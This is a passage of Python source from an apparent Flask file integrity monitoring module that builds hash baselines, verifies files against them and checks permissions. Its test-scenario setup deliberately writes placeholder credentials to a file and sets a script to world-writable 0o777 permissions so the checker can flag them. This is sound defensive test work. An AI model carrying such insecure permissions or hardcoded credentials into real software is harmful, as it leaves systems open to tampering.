                'test_executable.sh': '#!/bin/bash\necho "This is a test script"',
                'sensitive_data.txt': 'username=admin\npassword=admin123\napi_key=TEST_KEY_1234'
            }
        }

        # Create all the test files
        created_files = {}
        for category, files in scenarios.items():
            category_dir = os.path.join(test_dir, category)
            os.makedirs(category_dir, exist_ok=True)

            for filename, content in files.items():
                file_path = os.path.join(category_dir, filename)

                # Create/overwrite file if force is True or it doesn't exist
                if force or not os.path.exists(file_path):
                    with open(file_path, 'w') as f:
                        f.write(content)

                    # Set special permissions for permission tests
                    if category == 'permissions':
                        if filename.endswith('.sh'):
                            # Make executable with world-executable permissions (unsafe)
                            os.chmod(file_path, 0o777)
                        else:
                            # Make world-readable (unsafe for sensitive data)
                            os.chmod(file_path, 0o644)

                created_files[os.path.join(category, filename)] = file_path

                if verbose:
                    print(f"Created {category} test file: {filename}")

        # Create a development baseline with some files (but not the suspicious ones)
        baseline = {}
        for path, full_path in created_files.items():
            if 'suspicious' not in path:
                baseline[path] = calculate_file_hash(full_path)

        # Store the baseline in a development-specific file
        baseline_path = os.path.join(test_dir, 'dev_baseline.json')
        with open(baseline_path, 'w') as f:
            json.dump(baseline, f, indent=2)

        if verbose:
            print(f"Created development file integrity baseline at {baseline_path}")

        return {
            'test_dir': test_dir,
            'baseline': baseline,
            'baseline_path': baseline_path,
            'files': created_files
        }

    except Exception as e:
        logging.error(f"Error creating development file integrity scenarios: {str(e)}")
        if verbose:
            print(f"Error creating development file integrity scenarios: {str(e)}")
        return {}


def calculate_file_hash(file_path: str, algorithm: str = 'sha256') -> str:
    """
    Calculate the hash of a file using the specified algorithm.

    Args:
        file_path: Path to the file to hash
        algorithm: Hash algorithm to use (sha256, sha512, md5)

    Returns:
        str: Hexadecimal digest of the file hash
    """
    if algorithm == 'md5':
        hash_obj = hashlib.md5()
    elif algorithm == 'sha512':
        hash_obj = hashlib.sha512()
    else:
        hash_obj = hashlib.sha256()  # Default

    with open(file_path, 'rb') as f:
        # Read in chunks to handle large files efficiently
        for chunk in iter(lambda: f.read(4096), b''):
            hash_obj.update(chunk)

    return hash_obj.hexdigest()


def update_integrity_baseline(
    baseline_path: Optional[str] = None,
    force: bool = False,
    include_pattern: Optional[List[str]] = None,
    exclude_pattern: Optional[List[str]] = None,
    backup: bool = True,
    verbose: bool = False
) -> Dict[str, Any]:
    """
    Update the file integrity baseline by scanning for current files and hashes.

    This command creates or updates a file integrity baseline that can be used
    for security monitoring. It can selectively include/exclude files based on
    patterns and automatically backups existing baselines before modification.

    Args:
        baseline_path: Path to the baseline file to update. If not provided,
                      will use the application's configured baseline path
        force: If True, will force update even for critical files
        include_pattern: List of glob patterns to include (e.g. ["*.py", "config/*.ini"])
        exclude_pattern: List of glob patterns to exclude (e.g. ["*.pyc", "tmp/*"])
        backup: If True, will backup the existing baseline file before updating
        verbose: If True, will output detailed progress information

    Returns:
        dict: Dictionary with update statistics and paths

    Example:
        # Update baseline with specific includes/excludes
        result = update_integrity_baseline(
            include_pattern=["*.py", "config/*.yaml"],
            exclude_pattern=["__pycache__/*", "*.pyc"],
            verbose=True
        )
    """
    if verbose:
        print("Updating file integrity baseline...")

    # Track statistics
    stats = {
        'added': 0,
        'updated': 0,
        'unchanged': 0,
        'skipped': 0,
        'error': 0
    }

    # Check if app is available through Flask current_app
    if not hasattr(current_app, '_get_current_object'):
        if verbose:
            print("Error: No application context available")
        return {'success': False, 'error': 'No application context available'}

    try:
        # Use specified baseline or get from app config
        if not baseline_path:
            baseline_path = current_app.config.get('FILE_BASELINE_PATH')
            if not baseline_path:
                # Fall back to default in instance folder
                baseline_path = os.path.join(current_app.instance_path, 'file_baseline.json')
                if verbose:
                    print(f"Using default baseline path: {baseline_path}")

        # Make sure the directory exists
        os.makedirs(os.path.dirname(baseline_path), exist_ok=True)

        # Set default patterns if none provided
        if not include_pattern:
            include_pattern = current_app.config.get('CRITICAL_FILES_PATTERN', ["*.py", "config/*"])
            if verbose:
                print(f"Using default include patterns: {include_pattern}")

        if not exclude_pattern:
            exclude_pattern = current_app.config.get('IGNORE_PATTERN', ["__pycache__/*", "*.pyc", "*.pyo", "tmp/*"])
            if verbose:
                print(f"Using default exclude patterns: {exclude_pattern}")

        # Load existing baseline if it exists
        existing_baseline = {}
        if os.path.exists(baseline_path):
            try:
                with open(baseline_path, 'r') as f:
                    existing_baseline = json.load(f)

                if verbose:
                    print(f"Loaded existing baseline with {len(existing_baseline)} entries")

                # Create backup if requested
                if backup:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    backup_path = f"{baseline_path}.{timestamp}.bak"
                    with open(backup_path, 'w') as f:
                        json.dump(existing_baseline, f, indent=2)
                    if verbose:
                        print(f"Created baseline backup at {backup_path}")
            except (IOError, json.JSONDecodeError) as e:
                if verbose:
                    print(f"Warning: Could not load existing baseline: {str(e)}")

        # Initialize new baseline with existing entries
        new_baseline = existing_baseline.copy() if existing_baseline else {}

        # Generate file list based on patterns
        basedir = os.path.dirname(os.path.abspath(current_app.root_path))

        # Map to store all matched files
        matched_files = set()

        # Find all files matching include patterns
        for pattern in include_pattern:
            # Allow both absolute and relative paths
            if os.path.isabs(pattern):
                glob_pattern = pattern
            else:
                glob_pattern = os.path.join(basedir, pattern)

            # Find matching files
            for filepath in glob.glob(glob_pattern, recursive=True):
                if not os.path.isfile(filepath):
                    continue

                # Convert to relative path for consistency
                rel_path = os.path.relpath(filepath, basedir)

                # Skip if matches exclude pattern
                skip = False
                for exclude in exclude_pattern:
                    if fnmatch.fnmatch(rel_path, exclude):
                        skip = True
                        stats['skipped'] += 1
                        if verbose:
                            print(f"Skipped excluded file: {rel_path}")
                        break

                if not skip:
                    matched_files.add(rel_path)

        # Process each matched file
        for rel_path in sorted(matched_files):
            try:
                file_path = os.path.join(basedir, rel_path)

                # Skip files that exceed size limit
                max_size = current_app.config.get('MAX_BASELINE_FILE_SIZE', 10 * 1024 * 1024)
                if os.path.getsize(file_path) > max_size:
                    if verbose:
                        print(f"Skipping large file: {rel_path}")
                    stats['skipped'] += 1
                    continue

                # Calculate file hash
                algorithm = current_app.config.get('FILE_HASH_ALGORITHM', 'sha256')
                current_hash = calculate_file_hash(file_path, algorithm)

                # Check if file is new or modified
                if rel_path in new_baseline:
                    if new_baseline[rel_path] != current_hash:
                        # Check if this is a critical file and we're not forcing
                        is_critical = any(fnmatch.fnmatch(rel_path, pattern) for pattern in
                                         current_app.config.get('SECURITY_CRITICAL_FILES', []))

                        if is_critical and not force:
                            if verbose:
                                print(f"Warning: Critical file changed but not updating (use --force): {rel_path}")
                            stats['skipped'] += 1
                            continue

                        # Update hash
                        new_baseline[rel_path] = current_hash
                        stats['updated'] += 1
                        if verbose:
                            print(f"Updated: {rel_path}")
                    else:
                        # Hash unchanged
                        stats['unchanged'] += 1
                        if verbose and verbose > 1:  # More verbose output
                            print(f"Unchanged: {rel_path}")
                else:
                    # New file
                    new_baseline[rel_path] = current_hash
                    stats['added'] += 1
                    if verbose:
                        print(f"Added: {rel_path}")
            except Exception as e:
                stats['error'] += 1
                if verbose:
                    print(f"Error processing {rel_path}: {str(e)}")

        # Save updated baseline
        with open(baseline_path, 'w') as f:
            json.dump(new_baseline, f, indent=2, sort_keys=True)

        # Update app config with new baseline
        current_app.config['CRITICAL_FILE_HASHES'] = new_baseline

        # Log the update as a security event
        try:
            from core.security import log_security_event
            log_security_event(
                event_type="baseline_updated",
                description=f"File integrity baseline updated via command",
                severity="info",
                details={
                    'added': stats['added'],
                    'updated': stats['updated'],
                    'unchanged': stats['unchanged'],
                    'skipped': stats['skipped'],
                    'error': stats['error'],
                    'total_files': len(new_baseline)
                }
            )
        except ImportError:
            # If security event logging is not available, continue without it
            pass

        if verbose:
            print(f"\nBaseline update complete:")
            print(f"  - Files added:     {stats['added']}")
            print(f"  - Files updated:   {stats['updated']}")
            print(f"  - Files unchanged: {stats['unchanged']}")
            print(f"  - Files skipped:   {stats['skipped']}")
            print(f"  - Errors:          {stats['error']}")
            print(f"  - Total files:     {len(new_baseline)}")
            print(f"  - Baseline path:   {baseline_path}")

        return {
            'success': True,
            'stats': stats,
            'baseline_path': baseline_path,
            'total_files': len(new_baseline)
        }

    except Exception as e:
        error_msg = f"Error updating file integrity baseline: {str(e)}"
        logging.error(error_msg)
        if verbose:
            print(f"❌ {error_msg}")
        return {
            'success': False,
            'error': str(e)
        }


def verify_baseline_integrity(
    baseline_path: Optional[str] = None,
    report_only: bool = True,
    verbose: bool = False
) -> Dict[str, Any]:
    """
    Verify the integrity of files against a baseline.

    This function checks all files in the baseline to detect unauthorized
    modifications, permission changes, or missing files.

    Args:
        baseline_path: Path to the baseline file to check against. If not provided,
                      will use the application's configured baseline path
        report_only: If True, will only report issues without updating the baseline
        verbose: If True, will output detailed progress information

    Returns:
        dict: Dictionary with verification results and detected changes

    Example:
        # Check file integrity and display results
        result = verify_baseline_integrity(verbose=True)
        if result['changes_detected']:
            print(f"Warning: {len(result['changes'])} integrity violations found")
    """
    if verbose:
        print("Verifying file integrity against baseline...")

    # Check if app is available through Flask current_app
    if not hasattr(current_app, '_get_current_object'):
        if verbose:
            print("Error: No application context available")
        return {'success': False, 'error': 'No application context available'}

    try:
        # Use specified baseline or get from app config
        if not baseline_path:
            baseline_path = current_app.config.get('FILE_BASELINE_PATH')
            if not baseline_path:
                # Fall back to default in instance folder
                baseline_path = os.path.join(current_app.instance_path, 'file_baseline.json')

        # Ensure baseline file exists
        if not os.path.exists(baseline_path):
            error_msg = f"Baseline file not found: {baseline_path}"
            if verbose:
                print(f"Error: {error_msg}")
            return {'success': False, 'error': error_msg}

        # Load baseline
        with open(baseline_path, 'r') as f:
            baseline = json.load(f)

        if verbose:
            print(f"Loaded baseline with {len(baseline)} entries")

        # Store detected changes
        changes = []

        # Check each file in the baseline
        basedir = os.path.dirname(os.path.abspath(current_app.root_path))
        algorithm = current_app.config.get('FILE_HASH_ALGORITHM', 'sha256')

        for rel_path, expected_hash in baseline.items():
            file_path = os.path.join(basedir, rel_path)

            # Check if file exists
            if not os.path.exists(file_path):
                changes.append({
                    'path': rel_path,
                    'status': 'missing',
                    'severity': 'high',
                    'expected_hash': expected_hash
                })
                if verbose:
                    print(f"Missing: {rel_path}")
                continue

            # Check file hash
            try:
                current_hash = calculate_file_hash(file_path, algorithm)
                if current_hash != expected_hash:
                    # Determine severity based on file type and location
                    is_critical = any(fnmatch.fnmatch(rel_path, pattern) for pattern in
                                     current_app.config.get('SECURITY_CRITICAL_FILES', []))
                    severity = 'critical' if is_critical else 'high'

                    changes.append({
                        'path': rel_path,
                        'status': 'modified',
                        'severity': severity,
                        'expected_hash': expected_hash,
                        'current_hash': current_hash
                    })
                    if verbose:
                        print(f"Modified ({severity}): {rel_path}")
            except Exception as e:
                changes.append({
                    'path': rel_path,
                    'status': 'error',
                    'severity': 'medium',
                    'error': str(e)
                })
                if verbose:
                    print(f"Error checking {rel_path}: {str(e)}")

        # Check permissions if configured
        if current_app.config.get('CHECK_FILE_PERMISSIONS', True):
            for rel_path in baseline.keys():
                file_path = os.path.join(basedir, rel_path)
                if os.path.exists(file_path):
                    try:
                        # Check executability of non-executable files
                        if not rel_path.endswith(('.py', '.sh', '.bash')) and os.access(file_path, os.X_OK):
                            changes.append({
                                'path': rel_path,
                                'status': 'permission_issue',
                                'severity': 'medium',
                                'details': 'Non-executable file has executable permissions'
                            })
                            if verbose:
                                print(f"Permission issue: {rel_path} (executable)")

                        # Check world-writability
                        mode = os.stat(file_path).st_mode
                        if mode & 0o002:  # Check if world-writable
                            changes.append({
                                'path': rel_path,
                                'status': 'permission_issue',
                                'severity': 'high',
                                'details': 'File is world-writable'
                            })
                            if verbose:
                                print(f"Permission issue: {rel_path} (world-writable)")
                    except Exception as e:
                        # Skip permission check errors
                        pass

        # Log verification result
        try:
            from core.security import log_security_event
            severity = 'critical' if any(c['severity'] == 'critical' for c in changes) else \
                      'high' if any(c['severity'] == 'high' for c in changes) else \
                      'medium' if any(c['severity'] == 'medium' for c in changes) else \
                      'info'

            log_security_event(
                event_type="integrity_verification",
                description=f"File integrity verification completed with {len(changes)} issues",
                severity=severity if changes else 'info',
                details={
                    'changes_detected': len(changes),
                    'baseline_path': baseline_path,
                    'verification_time': datetime.now().isoformat()
                }
            )
        except ImportError:
            # If security event logging is not available, continue without it
            pass

        if verbose:
            print(f"\nVerification complete:")
            print(f"  - Files checked:   {len(baseline)}")
            print(f"  - Issues detected: {len(changes)}")
            if not changes:
                print("  - All files passed integrity check ✓")

        return {
            'success': True,
            'changes_detected': len(changes) > 0,
            'changes': changes,
            'files_checked': len(baseline),
            'baseline_path': baseline_path
        }

    except Exception as e:
        error_msg = f"Error verifying file integrity: {str(e)}"
        logging.error(error_msg)
        if verbose:
            print(f"❌ {error_msg}")
        return {
            'success': False,
            'error': str(e)
        }


def import_module_safely(module_name):
    """Helper function to safely import a module without raising exceptions."""
    try:
        return importlib.import_module(module_name)
    except (ImportError, ModuleNotFoundError):
        return None
